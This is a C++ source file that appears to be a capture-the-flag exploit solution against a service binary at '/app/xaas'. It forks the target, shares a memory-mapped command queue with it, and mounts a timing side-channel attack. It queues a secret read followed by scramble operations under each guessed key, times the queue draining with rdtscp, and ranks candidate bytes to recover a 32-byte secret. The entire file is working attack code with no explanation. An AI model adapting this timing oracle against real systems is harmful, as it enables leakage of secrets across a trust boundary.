#include "api.hxx"
#include "futex.hxx"

#include <algorithm>
#include <iostream>
#include <vector>

#include <fcntl.h>
#include <sys/eventfd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>

void terminate(const char *message) {
    std::cerr << "Fatal error: " << message << std::endl;
    std::cerr << "Terminating..." << std::endl;
    _Exit(1);
}

void require(bool condition, const char *message) {
    if (!condition) {
        terminate(message);
    }
}

void put_resize(Slot *slot, std::uint64_t completion_tag, std::uint32_t size) {
    slot->command = ResizeCommand;
    slot->completion_tag = completion_tag;
    slot->resize_request = {
        .size = size,
    };
}

void put_read_secret(Slot *slot, std::uint64_t completion_tag, std::uint32_t position, std::uint32_t dst, std::uint32_t length) {
    slot->command = ReadSecretCommand;
    slot->completion_tag = completion_tag;
    slot->read_secret_request = {
        .position = position,
        .dst = dst,
        .length = length,
    };
}

void put_scramble(Slot *slot, std::uint64_t completion_tag, std::uint32_t src, std::uint32_t dst, std::uint32_t length, std::uint8_t key) {
    slot->command = ScrambleCommand;
    slot->completion_tag = completion_tag;
    slot->scramble_request = {
        .src = src,
        .dst = dst,
        .length = length,
        .key = key,
    };
}

void put_stop(Slot *slot, std::uint64_t completion_tag) {
    slot->command = StopCommand;
    slot->completion_tag = completion_tag;
}

static inline __attribute__((always_inline))
std::uint32_t rdtscp() {
    std::uint64_t tsc;

    asm volatile(
        "rdtscp"
    :   "=&A" (tsc)
    :
    :   "rcx", "rdx", "cc"
    );

    return tsc;
}

Queue *queue;
int tail = 0;
int completion_fd = -1;

std::uint32_t oracle(std::uint32_t position, std::uint8_t key, std::size_t count) {
    put_read_secret(&queue->slots[(tail ++) % Queue::capacity], 0, position, 0, 1);
    put_scramble(&queue->slots[(tail ++) % Queue::capacity], 1, 0, 1, 4 * 1024 - 1, 0);
    queue->size += 2;
    futex_wake(&queue->size);

    eventfd_t completion_tag;
    require(::eventfd_read(completion_fd, &completion_tag) == 0, "Cannot read completion");

    static std::vector<std::uint32_t> samples(count, 0);
    for (auto sample = samples.begin(); sample != samples.end(); ) {
        uint32_t dst = 0;
        for (int i = 0; i != 0x80; ++ i) {
            dst += 4 * 1024;
            put_scramble(&queue->slots[(tail ++) % Queue::capacity], 0, 0, dst, 4 * 1024, key);
        }
        queue->size += 0x80;
        futex_wake(&queue->size);

        uint32_t begin = 0;
        while (0x78 <= queue->size) {
            begin = rdtscp();
        }

        uint32_t end = 0;
        while (queue->size) {
            end = rdtscp();
        }

        if ((begin != 0) && (end != 0)) {
            *sample = end - begin;
            ++ sample;
        }
    }

    std::sort(samples.begin(), samples.end());

    return samples[count / 4];
}

void attack(std::uint32_t position) {
    std::vector<std::pair<std::uint32_t, std::uint8_t>> results;
    for (int key = 0x20; key != 0x80; ++ key) {
        std::uint32_t latency = oracle(position, key, 0x1000);
        results.push_back(std::make_pair(latency, key));
    }

    std::sort(results.begin(), results.end());

    int rank = 0;
    std::cout << position;
    for (auto result = results.begin(); result != results.end(); ++ result) {
        ++ rank;
        if (3 < rank) {
            break;
        }
        std::cout << "\t" << result->second << " (" << result->first << ")";
    }
    std::cout << std::endl;
}

void solve(std::uint32_t size) {
    put_resize(&queue->slots[(tail ++) % Queue::capacity], 0, 516 * 1024);
    ++ queue->size;

    for (std::uint32_t position = 0; position != size; ++ position) {
        attack(position);
    }

    put_stop(&queue->slots[(tail ++) % Queue::capacity], 0);
    ++ queue->size;
    futex_wake(&queue->size);
}

int main(int argc, char *argv[]) {
    (void) argc;
    (void) argv;

    int queue_fd = ::memfd_create("queue", MFD_ALLOW_SEALING);
    require(queue_fd != -1, "Cannot create queue");

    require(::ftruncate(queue_fd, sizeof(Queue)) == 0, "Cannot resize queue");
    require(::fcntl(queue_fd, F_ADD_SEALS, F_SEAL_SEAL | F_SEAL_SHRINK) != -1, "Cannot seal queue");

    completion_fd = ::eventfd(0, 0);
    require(completion_fd != -1, "Cannot create completion");

    pid_t pid = ::fork();
    require(pid != -1, "Cannot fork");
    if (pid == 0) {
        std::string serialized_queue_fd = std::to_string(queue_fd);
        std::string serialized_completion_fd = std::to_string(completion_fd);
        ::execl("/app/xaas", "/app/xaas", serialized_queue_fd.c_str(), serialized_completion_fd.c_str(), NULL);
    }
    else {
        void *queue_mapping = ::mmap(nullptr, sizeof(Queue), PROT_READ | PROT_WRITE, MAP_SHARED, queue_fd, 0);
        require(queue_mapping != MAP_FAILED, "Cannot mmap queue");

        queue = static_cast<Queue *>(queue_mapping);
        solve(0x20);
    }
}
